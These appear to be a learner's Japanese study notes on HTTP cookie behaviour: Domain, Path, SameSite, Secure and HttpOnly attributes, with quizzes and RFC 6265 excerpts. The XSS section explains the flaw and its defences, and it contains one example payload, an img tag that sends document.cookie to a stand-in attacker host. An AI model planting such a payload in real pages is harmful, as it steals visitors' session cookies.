# クッキーを理解する

## 課題1

### クッキーとは何か？

`Set-Cookie` `ヘッダ` `サーバ` `ブラウザ`

`サーバ`からの`Set-Cookie`HTTP`ヘッダ`を介して`ブラウザ`に保存され、その後同じドメインへのリクエストの際に Cookie HTTP`ヘッダ`によって自動的に `サーバ`に送信されるデータのこと。

### 2

`www.hoge.com`で発行されたクッキーは、`www.fuga.com`には送信されない。

なぜならクッキーにはDomain属性というものがあり、これが指定されていない場合は同一オリジンにしか送られないから。

> Domain 属性は、Cookie を受信することができるホストを指定します。指定されていない場合は、既定でクッキーを設定したのと**同じオリジン**となり、サブドメインは除外されます。

[HTTP Cookie の使用 - HTTP | MDN](https://developer.mozilla.org/ja/docs/Web/HTTP/Cookies)

### 3

`hoge.com:8080`で発行されたクッキーは`hoge.com:9090`にも送信される。

MDNにはオリジンと書いてあるが、RFC6265によると、ポート番号までは区別しないという記述があり、実際ブラウザでもRFC通りの動作になっている。

[HTTP Cookie とポート番号 - sahara3のブログ](http://sahara3.hatenablog.com/entry/2018/03/11/145054)

### 4

`www.hoge.com`で発行されたクッキーは、`www.api.hoge.com`には送信されない。

なぜならドメイン名が違うため。`www.example.com`と`api.example.com`は別のドメイン名。

### 5

`Domain="hoge.com"`が指定されている場合、`api.hoge.com`にもクッキーは送信される。

Domain属性が指定されている場合、サブドメインにもクッキーが送信されるため。`hoge.com`のサブドメインである`api.hoge.com`にもクッキーが送信される。

### 6

JavaScriptからクッキーの取得を防ぐことは可能。クッキーに`HttpOnly`属性をつけることで、JavaScriptの`Document.cookie`APIからのアクセスを防ぐことができる。

### 7

HTTPS通信のときだけクッキーを送信することは可能。`Secure`属性がついたクッキーはHTTPSプロトコル上の暗号化された通信でのみクッキーを送信する。

### 8

クッキーに`Expires`を設定すると、セッションが終了したときに削除されず、設定された期日を過ぎると削除される。

### 9

`SameSite`属性とは、クッキーが送信されたドメイン名と異なるサイトからのリクエストの際に(`cross-site`のリクエスト)、クッキーを送信するかどうかを指定するための属性。

例えば、`cross.example.com`上にある`example.com`へのリンクをクリックする際に、`example.com`が受け取るリクエストは`cross-site`なリクエスト。

`cross-site`のリクエストに対して、

- `SameSite=Strict`の場合、クッキーを常に送信しない。
- `SameSite=Lax`の場合、リクエストが`GET`や`OPTIONS`等のsafeなメソッドで、かつ`Top Level Navigation`の場合のみ、クッキーが送信される。
  - `Top Level Navigation` : リクエストされたURLがアドレスバーに表示されるようなリクエスト
  - 例えば、imgやiframeでのリクエスト（クロスサイトサブリクエスト）ではクッキーは送信されず、ユーザーのリンククリックによるリクエストでは送信される。
- `SameSite=None`の場合、常にクッキーが送信される。

[SameSite 属性を使った Cookie のセキュアな運用を考える - 30歳からのプログラミング](https://numb86-tech.hatenablog.com/entry/2020/01/26/112607)

### 10

クッキーに格納しない方がいい値

- ユーザーのパスワード、クレジットカード番号等の個人情報
- 大量のデータ (4kb制限)
- 一般に公開したくないデータ、ユーザーから見られたくないデータ (devtools等から確認できてしまうため)
- 文字列以外のデータ (保存できるのはstringのみ)

### 11

クッキー: セッションID等、重要なデータを保存したい場合に使う。  
ローカルストレージ: 重要ではないデータ、5MB以内の少量なデータを保存したい場合に使う。

### 12

XSSとは、不正なスクリプトがWEBサイトに差し込まれてしまう脆弱性・それを使用した攻撃のこと。

例えば、XSS脆弱性があるサイトに、`<img src="atack.example.com/?cookie=document.cookie">`というHTMLを埋め込むことができれば、サイトに訪問したユーザーのクッキーを`atack.example.com`に送信することができてしまう。

対策としては、任意のスクリプト・HTMLを埋め込むことができないように、WEBページに出力するデータをエスケープしてから表示するようにする。その他には、HttpOnly属性をクッキーに付与することで、JavaScriptからのcookie読み取りを防ぐことができる。

- [Cross-site scripting (クロスサイトスクリプティング) - MDN Web Docs 用語集: ウェブ関連用語の定義 | MDN](https://developer.mozilla.org/ja/docs/Glossary/Cross-site_scripting)

## クイズ

### クイズ1

Domain属性とSameSite属性は、それぞれどのような場合に使用されますか？

<details><summary>回答例</summary>

Doamin属性は、Cookieを送信する範囲を広げるために使用する。例えば、`example.com` で発行されたクッキーを`api.example.com`にも送信したい（共有したい）場合に使用する。

SameSite属性は、クッキーが送信されたドメイン名と異なるサイトからのリクエストの際に、クッキーを送信するかどうかを指定するために使用する。例えば、`example.com` で発行されたクッキーを、`example.com`*以外*のWEBサイト上から送信したくない場合に `SameSite=Strict` を使用する。

</details>

### クイズ2

`example.com` が発行した`SameSite=Lax` が指定されているクッキーがあります。

`another.example.com` のWEBサイト上にある`example.com`というリンクから遷移した場合、 `example.com` にクッキーは送信されるでしょうか？

<details><summary>回答例</summary>

送信される。`SameSite=Lax`は、リンクをクリックして遷移する際のリクエストのような`Top Level Navigation`の場合にクッキーを送信する。

</details>

### クイズ3

`hoge.example.com`からDomain属性のついたクッキーを受信しました。

次のDomain属性の設定値のうち、ブラウザにクッキーが却下されず保存されるものはどれか？

- example.com
- api.hoge.example.com
- foo.example.com

<details><summary>回答例</summary>

- example.com

> UA は、クッキーの Domain 属性が，そのクッキーのオリジンサーバを内包するスコープを指定していない限り、そのクッキーを却下することになる。 例えば、 foo.example.com から受信したクッキーの Domain 属性の値が example.com や foo.example.com であれば，そのクッキーは受容されることになるが、 Domain 属性の値が bar.example.com や baz.foo.example.com であれば，そのクッキーは受容されないことになる。

[Cookies: HTTP State Management Mechanism （日本語訳）](https://triple-underscore.github.io/http-cookie-ja.html)

</details>

## メモ

> クッキーに Max-Age, Expires 両属性とも与えられている場合、 Max-Age 属性が優先され，クッキーの有効期限を制御する。 クッキーに Max-Age, Expires 両属性とも与えられていない場合、 UA は、（自身が定義する） “現在のセッションの終了時” まで，クッキーを維持することになる。

`Expires` と `Max-Age` は `Max-Age` が優先される。

---

> 警告： 一部の既存の UA は、 Domain 属性が無い下でも， Domain 属性が在って，現在のホスト名を包含していたかのように扱う。 例えば， `example.com` が Domain 属性が無い Set-Cookie ヘッダを返した場合、これらの UA は，そのクッキーを `www.example.com` にも誤って送信することになる。

Domainを指定しない方が安全だけど、それでもサブドメインにクッキーが送信されてしまう場合がある？

> 実際のブラウザで調査したところ、Domain属性のないCookieの挙動は以下の結果となりました。
> - IE9 サブドメインにも送信される
> - Firefox 7.0.1 RFC6265通り
> - Google Chrome 14.0.835.202 RFC6265通り
> - Safari 5.1 RFC6265通り
> - Opera 11.51 RFC6265通り
> - iモード(P-07A) サブドメインにも送信される
> - Android 2.3.3 RFC6265通り
> 
> (from http://blog.tokumaru.org/2011/10/cookiedomain.html )

とは言っても、モダンブラウザでは送信されないようになっているみたい。

---

> UA は、クッキーの Domain 属性が，そのクッキーのオリジンサーバを内包するスコープを指定していない限り、そのクッキーを却下することになる。 例えば、 foo.example.com から受信したクッキーの Domain 属性の値が example.com や foo.example.com であれば，そのクッキーは受容されることになるが、 Domain 属性の値が bar.example.com や baz.foo.example.com であれば，そのクッキーは受容されないことになる。

`オリジンサーバーを内包するスコープ`以外のdomainが指定された場合、UAはそのクッキーを却下する。前回の質問のうちの一つ「Domainに他のドメイン名を指定できるか？」への根拠。

---

> UA は、リクエスト URI のパス部位がクッキーの Path 属性にマッチする（またはその下位ディレクトリになっている）場合に限り，そのクッキーを HTTP リクエストに内包することになる

Path属性 = リクエストURIのパスまたは、リクエストURIの下位ディレクトリの場合のみ、クッキーを送信する。

> クッキーの属性は、 UA からサーバへは返されないことに注意。 特に，サーバは、 Cookie ヘッダ単独からは，クッキーが［ いつ失効するのか？／ どのホストに有効なのか？／ どのパスに有効なのか？／ Secure や HttpOnly 属性を伴って設定されたものかどうか？ ］を決定できない。

サーバーからは、クッキーそのものからはいつ失効するのか？セキュアなものか？を判別できない

---

> ブラウザは3rd partyのSet-Cookieヘッダを無視できると仕様に書かれています。
> 
> ここでいう3rd partyとは、「利用者が直接­訪問しているドメインではないドメイン」のことを指します。

なるほど〜、imgのリクエスト先とか、iframeのリクエスト先からのクッキーが3rd Party Cookieってことね。

> 3rd partyとの通信において、
>
> - Set-Cookieヘッダを無視する
> - Access-Control-Allow-Originヘッダを見て、レスポンスをブラウザ側で破棄する
> 
> といったことはブラウザでは既に対応されていますが、Cookieを載せたリクエスト自体は行えることになっています。
>
> この際、サーバー側ではそのリクエストが正規のものなのか不正にコールされたものなのか判別できないという問題があります。

---

> foo.example.com のサーバは、 Domain 属性 "example.com" のクッキーを設定できる（既存の "example.com" クッキーを上書きする可能性もある）

>  http://example.com/foo/bar に向けたリクエストに対する HTTP レスポンスは、 Path 属性 "/qux" のクッキーを設定できる。 

サブドメインからクッキーの上書きができる。

---

> これに対して、「ユーザーが意図しない形での Cookie の送信」をそもそも発生させないようにする、というのがSameSite属性の特徴である。

[SameSite 属性を使った Cookie のセキュアな運用を考える - 30歳からのプログラミング](https://numb86-tech.hatenablog.com/entry/2020/01/26/112607)

---

> オリジンではなくドメインで判断するので、注意する。例えばhttp://a.com/からhttps://a.com/mypageにリクエストが発生する場合は、プロトコルが違うのでオリジンは異なるが、ドメインはどちらもa.comなので、これはsame-siteになる。

same-siteとcross-siteは、オリジンではなく、ドメイン名で判断される。

[SameSite 属性を使った Cookie のセキュアな運用を考える - 30歳からのプログラミング](https://numb86-tech.hatenablog.com/entry/2020/01/26/112607)

---

> Cookie は、 Set-Cookie によって提供したドメインと紐づけてブラウザに保存され、同じドメインへのリクエストに自動的に付与される。

**自動的に付与される**

[Cookie の性質を利用した攻撃と Same Site Cookie の効果 | blog.jxck.io](https://blog.jxck.io/entries/2018-10-26/same-site-cookie.html)

---

- [Cookies: HTTP State Management Mechanism （日本語訳）](https://triple-underscore.github.io/http-cookie-ja.html)
  - RFC6265の翻訳、注釈まであってわかりやすい
- [社内勉強会でCookieの仕様とセキュリティについて話しました - Opt Technologies Magazine](https://tech-magazine.opt.ne.jp/entry/2016/09/12/112048)
  - RFCをもとに分かりづらいところを書いてくれてる。
- [SameSite 属性を使った Cookie のセキュアな運用を考える - 30歳からのプログラミング](https://numb86-tech.hatenablog.com/entry/2020/01/26/112607)
  - RFC6265に載っていないSame-Siteについて詳しく書いてくれている。
- [3分でわかるXSSとCSRFの違い - Qiita](https://qiita.com/wanko5296/items/142b5b82485b0196a2da)
  - 「XSSとCSRFの違い」のところの表が分かりやすかった。
- [これで完璧！今さら振り返る CSRF 対策と同一オリジンポリシーの基礎 - Qiita](https://qiita.com/mpyw/items/0595f07736cfa5b1f50c)
  - 同一オリジンポリシーというものがある。
    - これは、（アクセス中のサイトと）異なるオリジンのWEBサイトに対し、HTTPリクエストは送ることができるが、結果の読み取りはできない（レスポンスを使用できない）
    - つまり、異なるオリジン（自サイト以外から）のWEBサイト上にあるHTTPリクエストをブロックしたい
    - > XMLHttpRequest や fetch() に関しては，結果の取得部分で必ずエラーが発生してブロックされますが，リクエスト自体は送ることができてしまいます。
- [HTML5のLocal Storageを使ってはいけない（翻訳）｜TechRacho（テックラッチョ）〜エンジニアの「？」を「！」に〜｜BPS株式会社](https://techracho.bpsinc.jp/hachi8833/2019_10_09/80851)
  - ローカルストレージに重要な情報を保存するべきではない！という話
  - XSSに対して完全に安全な場合でも、外部リソースが乗っ取られた場合同様に盗まれてしまう
